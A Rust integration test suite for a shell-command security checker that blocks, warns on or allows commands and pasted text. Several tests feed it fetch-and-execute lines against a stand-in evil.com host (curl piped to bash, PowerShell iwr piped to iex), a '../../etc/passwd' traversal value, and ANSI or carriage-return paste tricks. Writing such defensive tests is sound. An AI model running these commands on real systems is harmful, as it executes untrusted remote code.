//! Integration tests for the tirith CLI binary.
//! Tests exercise subcommands via process invocation.

use std::fs;
#[cfg(unix)]
use std::io::Write;
use std::path::PathBuf;
use std::process::Command;

fn tirith() -> Command {
    let mut cmd = Command::new(env!("CARGO_BIN_EXE_tirith"));
    // Clear bypass env
    cmd.env_remove("TIRITH");
    cmd
}

// ─── check subcommand ───

#[test]
fn check_clean_command_allows() {
    let out = tirith()
        .args(["check", "--shell", "posix", "--", "ls -la"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0), "clean command should exit 0");
}

#[test]
fn check_curl_pipe_bash_blocks() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "posix",
            "--",
            "curl https://example.com/install.sh | bash",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(1), "curl pipe bash should exit 1");
}

#[test]
fn check_http_to_sink_blocks() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "posix",
            "--",
            "curl http://evil.com/payload",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(1), "http to sink should exit 1");
}

#[test]
fn check_shortened_url_warns() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "posix",
            "--",
            "curl https://bit.ly/abc123",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(
        out.status.code(),
        Some(2),
        "shortened URL should exit 2 (warn)"
    );
}

#[test]
fn check_json_output() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "posix",
            "--json",
            "--",
            "curl https://example.com/install.sh | bash",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(1));
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value =
        serde_json::from_str(&stdout).expect("output should be valid JSON");
    assert_eq!(json["schema_version"], 2);
    assert_eq!(json["action"], "block");
    assert!(!json["findings"].as_array().unwrap().is_empty());
}

#[test]
fn check_json_clean_output() {
    let out = tirith()
        .args(["check", "--shell", "posix", "--json", "--", "echo hello"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value =
        serde_json::from_str(&stdout).expect("output should be valid JSON");
    assert_eq!(json["schema_version"], 2);
    assert_eq!(json["action"], "allow");
}

#[test]
fn check_powershell_iwr_iex_blocks() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "powershell",
            "--",
            "iwr https://evil.com/script.ps1 | iex",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(1), "iwr | iex should exit 1");
}

#[test]
fn check_powershell_invoke_expression_blocks() {
    let out = tirith()
        .args([
            "check",
            "--shell",
            "powershell",
            "--",
            "Invoke-WebRequest https://evil.com/script.ps1 | Invoke-Expression",
        ])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(1));
}

// ─── paste subcommand ───

#[test]
fn paste_clean_text_allows() {
    let out = tirith()
        .args(["paste", "--shell", "posix"])
        .stdin(std::process::Stdio::piped())
        .output()
        .expect("failed to run tirith");
    // Empty stdin → allow
    assert_eq!(out.status.code(), Some(0));
}

#[test]
fn paste_ansi_escape_blocks() {
    use std::io::Write;
    let mut child = tirith()
        .args(["paste", "--shell", "posix"])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("failed to spawn tirith");

    // Write ANSI escape sequence
    child
        .stdin
        .take()
        .unwrap()
        .write_all(b"hello \x1b[31mred\x1b[0m world")
        .unwrap();

    let out = child.wait_with_output().unwrap();
    assert_eq!(
        out.status.code(),
        Some(1),
        "paste with ANSI escapes should block"
    );
}

// ─── score subcommand ───

#[test]
fn score_clean_url() {
    let out = tirith()
        .args(["score", "https://example.com/page"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
}

#[test]
fn score_suspicious_url() {
    let out = tirith()
        .args(["score", "https://bit.ly/abc123"])
        .output()
        .expect("failed to run tirith");
    // Should complete with exit 0 (score always returns 0)
    assert_eq!(out.status.code(), Some(0));
}

#[test]
fn score_json_output() {
    let out = tirith()
        .args(["score", "--json", "https://bit.ly/abc123"])
        .output()
        .expect("failed to run tirith");
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value =
        serde_json::from_str(&stdout).expect("score --json should output valid JSON");
    assert!(json.get("findings").is_some());
}

// ─── why subcommand ───

#[test]
fn why_no_trigger() {
    let out = tirith()
        .args(["why"])
        .output()
        .expect("failed to run tirith");
    // May exit 1 if no last_trigger.json exists, that's fine
    assert!(
        out.status.code() == Some(0) || out.status.code() == Some(1),
        "why should exit 0 or 1"
    );
}

// ─── init subcommand ───

#[test]
fn init_zsh_output() {
    let out = tirith()
        .args(["init", "--shell", "zsh"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    // Should output sourceable shell code or instructions
    assert!(
        stdout.contains("zsh-hook.zsh") || stdout.contains("source"),
        "init --shell zsh should reference zsh hook"
    );
}

#[test]
fn init_bash_output() {
    let out = tirith()
        .args(["init", "--shell", "bash"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        stdout.contains("bash-hook.bash"),
        "init --shell bash should reference bash hook"
    );
    assert!(
        !stdout.contains("export TIRITH_BASH_MODE=enter"),
        "init --shell bash should not override user-provided TIRITH_BASH_MODE"
    );
}

#[test]
fn init_unsupported_shell() {
    let out = tirith()
        .args(["init", "--shell", "tcsh"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(1));
}

#[cfg(unix)]
#[test]
fn bash_hook_defaults_to_preexec_in_ssh_sessions() {
    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );
    let script = format!(
        "unset TIRITH_BASH_MODE; export SSH_CONNECTION=1; source '{}'; printf '%s' \"$_TIRITH_BASH_MODE\"",
        hook
    );
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script])
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert_eq!(
        stdout, "preexec",
        "SSH sessions should default to preexec mode"
    );
}

#[cfg(unix)]
#[test]
fn bash_hook_respects_explicit_mode_override_in_ssh_sessions() {
    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );
    let script = format!(
        "export TIRITH_BASH_MODE=enter; export SSH_CONNECTION=1; source '{}'; printf '%s' \"$_TIRITH_BASH_MODE\"",
        hook
    );
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script])
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert_eq!(
        stdout, "enter",
        "explicit TIRITH_BASH_MODE should take precedence"
    );
}

#[test]
fn embedded_shell_hooks_match_repo_hooks() {
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let embedded_dir = manifest_dir.join("assets/shell/lib");
    let repo_dir = manifest_dir.join("../../shell/lib");

    if !repo_dir.exists() {
        // Skip outside workspace layout (e.g. crate-only package test).
        return;
    }

    for hook in [
        "zsh-hook.zsh",
        "bash-hook.bash",
        "fish-hook.fish",
        "powershell-hook.ps1",
    ] {
        let embedded = fs::read_to_string(embedded_dir.join(hook))
            .unwrap_or_else(|e| panic!("failed reading embedded hook {hook}: {e}"));
        let repo = fs::read_to_string(repo_dir.join(hook))
            .unwrap_or_else(|e| panic!("failed reading repo hook {hook}: {e}"));
        assert_eq!(
            embedded, repo,
            "embedded hook {hook} must stay in sync with shell/lib/{hook}"
        );
    }
}

// ─── Tier 1 early exit (no I/O) ───

#[test]
fn tier1_exit_fast_for_ls() {
    let out = tirith()
        .args(["check", "--json", "--shell", "posix", "--", "ls -la /tmp"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
    // Tier reached should be 1 (early exit)
    assert_eq!(json["tier_reached"], 1, "ls should exit at Tier 1");
}

#[test]
fn tier3_reached_for_curl() {
    let out = tirith()
        .args([
            "check",
            "--json",
            "--shell",
            "posix",
            "--",
            "curl https://example.com/install.sh | bash",
        ])
        .output()
        .expect("failed to run tirith");
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
    assert_eq!(
        json["tier_reached"], 3,
        "curl pipe bash should reach Tier 3"
    );
}

// ─── TIRITH=0 bypass ───

#[test]
fn bypass_in_interactive_mode() {
    let out = tirith()
        .env("TIRITH", "0")
        .args([
            "check",
            "--json",
            "--shell",
            "posix",
            "--",
            "curl https://example.com/install.sh | bash",
        ])
        .output()
        .expect("failed to run tirith");
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
    // Bypass may or may not be honored depending on policy defaults
    assert!(json.get("bypass_requested").is_some());
}

// ─── observability fields ───

#[test]
fn json_includes_observability() {
    let out = tirith()
        .args([
            "check",
            "--json",
            "--shell",
            "posix",
            "--",
            "curl https://example.com/install.sh | bash",
        ])
        .output()
        .expect("failed to run tirith");
    let stdout = String::from_utf8_lossy(&out.stdout);
    let json: serde_json::Value = serde_json::from_str(&stdout).unwrap();
    // Check observability fields exist
    assert!(json.get("timings_ms").is_some());
    assert!(json.get("tier_reached").is_some());
    assert!(json.get("urls_extracted_count").is_some());
}

// ─── diff subcommand ───

#[test]
fn diff_url() {
    let out = tirith()
        .args(["diff", "https://example.com/page"])
        .output()
        .expect("failed to run tirith");
    assert_eq!(out.status.code(), Some(0));
}

// ─── receipt subcommand ───

#[test]
fn receipt_list_empty() {
    let out = tirith()
        .args(["receipt", "list"])
        .output()
        .expect("failed to run tirith");
    // Should succeed even with no receipts
    assert!(
        out.status.code() == Some(0) || out.status.code() == Some(1),
        "receipt list should work"
    );
}

// ─── CR paste normalization ───

#[cfg(unix)]
#[test]
fn paste_trailing_cr_allows() {
    let mut child = Command::new(env!("CARGO_BIN_EXE_tirith"))
        .args(["paste", "--shell", "posix"])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("failed to spawn tirith");
    child
        .stdin
        .as_mut()
        .unwrap()
        .write_all(b"/some/path\r")
        .unwrap();
    let out = child.wait_with_output().unwrap();
    assert_eq!(
        out.status.code(),
        Some(0),
        "trailing \\r should not trigger control_chars block"
    );
}

#[cfg(unix)]
#[test]
fn paste_embedded_cr_blocks() {
    let mut child = Command::new(env!("CARGO_BIN_EXE_tirith"))
        .args(["paste", "--shell", "posix"])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("failed to spawn tirith");
    child
        .stdin
        .as_mut()
        .unwrap()
        .write_all(b"safe\rmalicious")
        .unwrap();
    let out = child.wait_with_output().unwrap();
    assert_eq!(
        out.status.code(),
        Some(1),
        "embedded \\r before non-\\n should trigger block"
    );
}

#[cfg(unix)]
#[test]
fn paste_windows_crlf_allows() {
    let mut child = Command::new(env!("CARGO_BIN_EXE_tirith"))
        .args(["paste", "--shell", "posix"])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("failed to spawn tirith");
    child
        .stdin
        .as_mut()
        .unwrap()
        .write_all(b"echo hello\r\necho world\r\n")
        .unwrap();
    let out = child.wait_with_output().unwrap();
    assert_eq!(
        out.status.code(),
        Some(0),
        "Windows \\r\\n line endings should not trigger block"
    );
}

// ─── Bash hook mode selection ───

#[cfg(unix)]
#[test]
fn bash_hook_enter_default_outside_ssh() {
    let tmpdir = tempfile::tempdir().expect("failed to create tmpdir");
    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );
    let script = format!(
        "unset TIRITH_BASH_MODE; unset SSH_CONNECTION; unset SSH_TTY; unset SSH_CLIENT; source '{}'; printf '%s' \"$_TIRITH_BASH_MODE\"",
        hook
    );
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script])
        .env("XDG_STATE_HOME", tmpdir.path())
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert_eq!(
        stdout, "enter",
        "non-SSH sessions should default to enter mode"
    );
}

#[cfg(unix)]
#[test]
fn bash_hook_honors_persistent_safe_mode() {
    let tmpdir = tempfile::tempdir().expect("failed to create tmpdir");
    let state_dir = tmpdir.path().join("tirith");
    fs::create_dir_all(&state_dir).unwrap();
    fs::write(state_dir.join("bash-safe-mode"), "1\n").unwrap();

    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );
    let script = format!(
        "unset TIRITH_BASH_MODE; unset SSH_CONNECTION; unset SSH_TTY; unset SSH_CLIENT; source '{}'; printf '%s' \"$_TIRITH_BASH_MODE\"",
        hook
    );
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script])
        .env("XDG_STATE_HOME", tmpdir.path())
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert_eq!(
        stdout, "preexec",
        "persistent safe-mode flag should force preexec"
    );
}

#[cfg(unix)]
#[test]
fn bash_hook_explicit_override_trumps_safe_mode() {
    let tmpdir = tempfile::tempdir().expect("failed to create tmpdir");
    let state_dir = tmpdir.path().join("tirith");
    fs::create_dir_all(&state_dir).unwrap();
    fs::write(state_dir.join("bash-safe-mode"), "1\n").unwrap();

    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );
    let script = format!(
        "export TIRITH_BASH_MODE=enter; source '{}'; printf '%s' \"$_TIRITH_BASH_MODE\"",
        hook
    );
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script])
        .env("XDG_STATE_HOME", tmpdir.path())
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert_eq!(
        stdout, "enter",
        "explicit TIRITH_BASH_MODE should override safe-mode flag"
    );
}

#[cfg(unix)]
#[test]
fn bash_hook_prompt_hook_reattaches() {
    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );
    // Source hook, overwrite PROMPT_COMMAND, call ensure, check re-attached
    let script = format!(
        "source '{}'; PROMPT_COMMAND='other_fn'; _tirith_ensure_prompt_hook; [[ \"$PROMPT_COMMAND\" == *_tirith_prompt_hook* ]] && printf 'reattached' || printf 'missing'",
        hook
    );
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script])
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert_eq!(
        stdout, "reattached",
        "_tirith_ensure_prompt_hook should reattach when overwritten"
    );
}

// ─── Startup gate degrade + persistence ───

#[cfg(unix)]
fn expect_available() -> bool {
    Command::new("sh")
        .args(["-c", "command -v expect >/dev/null 2>&1"])
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

#[cfg(unix)]
fn bash_major_version() -> Option<u32> {
    let out = Command::new("bash").arg("--version").output().ok()?;
    if !out.status.success() {
        return None;
    }
    let first = String::from_utf8_lossy(&out.stdout)
        .lines()
        .next()
        .unwrap_or_default()
        .to_string();
    let marker = "version ";
    let idx = first.find(marker)?;
    let rest = &first[idx + marker.len()..];
    let major = rest.split('.').next()?.trim().parse::<u32>().ok()?;
    Some(major)
}

#[cfg(unix)]
#[test]
fn bash_hook_startup_gate_degrade_persists() {
    let tmpdir = tempfile::tempdir().expect("failed to create tmpdir");

    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );

    // Step 1: Source hook in interactive bash with forced health gate failure.
    // `bash --norc --noprofile -i -c` gives interactive context so enter mode activates
    // without loading user config (which may set _TIRITH_BASH_LOADED).
    // _TIRITH_TEST_FAIL_HEALTH=1 forces the health gate to fail.
    let script = format!(
        "_TIRITH_TEST_FAIL_HEALTH=1; source '{}'; printf '%s' \"$_TIRITH_BASH_MODE\"",
        hook
    );
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-i", "-c", &script])
        .env("XDG_STATE_HOME", tmpdir.path())
        .env_remove("TIRITH_BASH_MODE")
        .env_remove("SSH_CONNECTION")
        .env_remove("SSH_TTY")
        .env_remove("SSH_CLIENT")
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert_eq!(
        stdout, "preexec",
        "health gate failure should degrade to preexec"
    );

    // Step 2: Verify safe-mode flag was persisted
    let flag = tmpdir.path().join("tirith/bash-safe-mode");
    assert!(
        flag.exists(),
        "safe-mode flag should be persisted after degrade"
    );

    // Step 3: Source hook in new shell — should start in preexec from flag
    let script2 = format!(
        "unset TIRITH_BASH_MODE; unset SSH_CONNECTION; unset SSH_TTY; unset SSH_CLIENT; source '{}'; printf '%s' \"$_TIRITH_BASH_MODE\"",
        hook
    );
    let out2 = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script2])
        .env("XDG_STATE_HOME", tmpdir.path())
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    let stdout2 = String::from_utf8_lossy(&out2.stdout);
    assert_eq!(
        stdout2, "preexec",
        "subsequent shells should start in preexec from persisted flag"
    );
}

#[cfg(unix)]
#[test]
fn bash_hook_runtime_delivery_failure_degrades_in_pty() {
    if !expect_available() {
        eprintln!("skipping PTY test: expect not available");
        return;
    }
    if bash_major_version().map(|v| v < 5).unwrap_or(true) {
        eprintln!("skipping PTY test: requires bash >= 5");
        return;
    }

    let tmpdir = tempfile::tempdir().expect("failed to create tmpdir");
    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );

    // Exercise the runtime _tirith_enter failure path in a real interactive PTY:
    // 1) Start in enter mode (startup gate bypassed for this test only).
    // 2) Break PROMPT_COMMAND delivery by making it readonly without tirith hook.
    // 3) Press Enter on a command and verify auto-degrade message appears.
    let expect_script = r#"
set timeout 20
set hook $env(HOOK_PATH)
spawn -noecho bash --norc --noprofile -i
expect -re {[$#] $}
send -- "export PS1='PROMPT> '\r"
expect "PROMPT> "
send -- "source '$hook'\r"
expect "PROMPT> "
send -- "PROMPT_COMMAND=':'; readonly PROMPT_COMMAND\r"
expect "PROMPT> "
send -- "echo PTY_RUNTIME_CHECK\r"
expect {
  -re {switching to preexec} {}
  timeout { exit 2 }
}
send -- "\r"
expect "PROMPT> "
send -- "exit\r"
expect eof
"#;

    let out = Command::new("expect")
        .args(["-c", expect_script])
        .env("HOOK_PATH", &hook)
        .env("XDG_STATE_HOME", tmpdir.path())
        .env("_TIRITH_TEST_SKIP_HEALTH", "1")
        .env_remove("TIRITH_BASH_MODE")
        .env_remove("SSH_CONNECTION")
        .env_remove("SSH_TTY")
        .env_remove("SSH_CLIENT")
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run expect");

    assert!(
        out.status.success(),
        "expect-driven PTY test failed (code {:?})\nstdout:\n{}\nstderr:\n{}",
        out.status.code(),
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );

    let flag = tmpdir.path().join("tirith/bash-safe-mode");
    assert!(
        flag.exists(),
        "runtime delivery failure should persist safe-mode flag"
    );
}

// ─── Non-interactive policy tests ───

#[cfg(unix)]
#[test]
fn bash_hook_noninteractive_no_safe_mode_flag() {
    let tmpdir = tempfile::tempdir().expect("failed to create tmpdir");

    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );
    let script = format!(
        "unset TIRITH_BASH_MODE; unset SSH_CONNECTION; unset SSH_TTY; unset SSH_CLIENT; source '{}'",
        hook
    );
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script])
        .env("XDG_STATE_HOME", tmpdir.path())
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    assert_eq!(out.status.code(), Some(0));
    let flag = tmpdir.path().join("tirith/bash-safe-mode");
    assert!(
        !flag.exists(),
        "non-interactive sourcing should never write safe-mode flag"
    );
}

#[cfg(unix)]
#[test]
fn bash_hook_noninteractive_no_debug_trap() {
    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );
    let script = format!(
        "unset TIRITH_BASH_MODE; unset SSH_CONNECTION; unset SSH_TTY; unset SSH_CLIENT; source '{}'; trap -p DEBUG",
        hook
    );
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script])
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        stdout.trim().is_empty(),
        "non-interactive sourcing should not install DEBUG trap, got: {stdout}"
    );
}

#[cfg(unix)]
#[test]
fn bash_hook_noninteractive_mode_is_enter() {
    let tmpdir = tempfile::tempdir().expect("failed to create tmpdir");
    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );
    let script = format!(
        "unset TIRITH_BASH_MODE; unset SSH_CONNECTION; unset SSH_TTY; unset SSH_CLIENT; source '{}'; printf '%s' \"$_TIRITH_BASH_MODE\"",
        hook
    );
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", &script])
        .env("XDG_STATE_HOME", tmpdir.path())
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run bash");
    assert_eq!(out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert_eq!(
        stdout, "enter",
        "non-interactive enter mode: variable is set but nothing installed"
    );
}

// ─── Security audit fix tests ───

#[cfg(unix)]
#[test]
fn paste_oversized_input_rejected() {
    use std::io::Write;

    let mut child = Command::new(env!("CARGO_BIN_EXE_tirith"))
        .args(["paste", "--shell", "posix"])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("failed to spawn tirith");

    // Write >1 MiB of data
    let data = vec![b'A'; 1024 * 1024 + 100];
    child.stdin.take().unwrap().write_all(&data).unwrap();

    let out = child.wait_with_output().unwrap();
    assert_eq!(out.status.code(), Some(1), "paste >1MiB should exit 1");
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("1 MiB"),
        "stderr should mention 1 MiB limit, got: {stderr}"
    );
}

#[test]
fn receipt_verify_invalid_sha256_rejected() {
    let out = tirith()
        .args(["receipt", "verify", "../../etc/passwd"])
        .output()
        .expect("failed to run tirith");
    assert_ne!(
        out.status.code(),
        Some(0),
        "path traversal sha256 should be rejected"
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("invalid sha256"),
        "stderr should mention invalid sha256, got: {stderr}"
    );
}

// ─── Fail-safe regression tests (unexpected exit code) ───

#[cfg(unix)]
#[test]
fn bash_hook_unexpected_rc_logic_test() {
    // Pure structural test: verify the if/elif/else branching for exit codes
    let script = r#"
for rc in 0 1 2 137; do
  if [[ $rc -eq 0 ]]; then
    printf "rc=%d:ALLOW\n" "$rc"
  elif [[ $rc -eq 2 ]]; then
    printf "rc=%d:WARN\n" "$rc"
  elif [[ $rc -eq 1 ]]; then
    printf "rc=%d:BLOCK\n" "$rc"
  else
    printf "rc=%d:UNEXPECTED\n" "$rc"
  fi
done
"#;
    let out = Command::new("bash")
        .args(["--norc", "--noprofile", "-c", script])
        .output()
        .expect("failed to run bash");
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(stdout.contains("rc=0:ALLOW"), "rc=0 should ALLOW");
    assert!(stdout.contains("rc=1:BLOCK"), "rc=1 should BLOCK");
    assert!(stdout.contains("rc=2:WARN"), "rc=2 should WARN");
    assert!(
        stdout.contains("rc=137:UNEXPECTED"),
        "rc=137 should be UNEXPECTED"
    );
}

#[cfg(unix)]
#[test]
fn zsh_unexpected_rc_branch_logic_test() {
    // Structural test: verify zsh branching pattern
    let script = r#"
rc=137
if [[ $rc -eq 0 ]]; then echo ALLOW
elif [[ $rc -eq 2 ]]; then echo WARN
elif [[ $rc -eq 1 ]]; then echo BLOCK
else echo UNEXPECTED; fi
"#;
    let out = Command::new("zsh").args(["-c", script]).output();
    match out {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            assert!(
                stdout.trim() == "UNEXPECTED",
                "zsh rc=137 should be UNEXPECTED, got: {stdout}"
            );
        }
        Err(_) => {
            eprintln!("skipping zsh branch test: zsh not available");
        }
    }
}

#[cfg(unix)]
#[test]
fn fish_unexpected_rc_branch_logic_test() {
    // Structural test: verify fish branching pattern
    let script = r#"set rc 137
if test $rc -eq 0; echo ALLOW
else if test $rc -eq 2; echo WARN
else if test $rc -eq 1; echo BLOCK
else; echo UNEXPECTED; end"#;
    let out = Command::new("fish").args(["-c", script]).output();
    match out {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            assert!(
                stdout.trim() == "UNEXPECTED",
                "fish rc=137 should be UNEXPECTED, got: {stdout}"
            );
        }
        Err(_) => {
            eprintln!("skipping fish branch test: fish not available");
        }
    }
}

#[cfg(unix)]
#[test]
fn bash_hook_unexpected_rc_degrades_in_pty() {
    if !expect_available() {
        eprintln!("skipping PTY test: expect not available");
        return;
    }
    if bash_major_version().map(|v| v < 5).unwrap_or(true) {
        eprintln!("skipping PTY test: requires bash >= 5");
        return;
    }

    let tmpdir = tempfile::tempdir().expect("failed to create tmpdir");
    let hook = format!(
        "{}/assets/shell/lib/bash-hook.bash",
        env!("CARGO_MANIFEST_DIR")
    );
    let marker = tmpdir.path().join("marker");

    // Create a fake tirith that always exits 137
    let fake_tirith = tmpdir.path().join("tirith");
    fs::write(&fake_tirith, "#!/bin/sh\nexit 137\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&fake_tirith, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    let marker_str = marker.display().to_string();
    let fake_dir = tmpdir.path().display().to_string();

    let expect_script = format!(
        r#"
set timeout 20
set hook "{hook}"
set marker "{marker_str}"
set fake_dir "{fake_dir}"
spawn -noecho bash --norc --noprofile -i
expect -re {{[$#] $}}
send -- "export PS1='PROMPT> '\r"
expect "PROMPT> "
send -- "export PATH=$fake_dir:$PATH\r"
expect "PROMPT> "
send -- "export TIRITH_BASH_MODE=enter\r"
expect "PROMPT> "
send -- "export _TIRITH_TEST_SKIP_HEALTH=1\r"
expect "PROMPT> "
send -- "source '$hook'\r"
expect "PROMPT> "
send -- "touch $marker\r"
sleep 1
send -- "\x15"
sleep 0.5
send -- "echo MODE=$_TIRITH_BASH_MODE\r"
expect {{
  -re {{MODE=preexec}} {{}}
  timeout {{ exit 2 }}
}}
send -- "exit\r"
expect eof
"#
    );

    let out = Command::new("expect")
        .args(["-c", &expect_script])
        .env("XDG_STATE_HOME", tmpdir.path().join("state"))
        .env_remove("TIRITH_BASH_MODE")
        .env_remove("SSH_CONNECTION")
        .env_remove("SSH_TTY")
        .env_remove("SSH_CLIENT")
        .env_remove("_TIRITH_BASH_LOADED")
        .output()
        .expect("failed to run expect");

    let stdout = String::from_utf8_lossy(&out.stdout);

    // Marker file should NOT exist (command was blocked/preserved)
    assert!(
        !marker.exists(),
        "marker file should not exist — command should not have executed"
    );

    // Output should mention unexpected exit code or switching to preexec
    assert!(
        stdout.contains("unexpected exit code") || stdout.contains("switching to preexec"),
        "output should mention degrade reason, got:\n{stdout}"
    );

    // Mode should have degraded to preexec
    assert!(
        stdout.contains("MODE=preexec"),
        "mode should degrade to preexec, got:\n{stdout}"
    );

    // Safe-mode flag should be persisted
    let flag = tmpdir.path().join("state/tirith/bash-safe-mode");
    assert!(
        flag.exists(),
        "safe-mode flag should be persisted after unexpected rc degrade"
    );
}
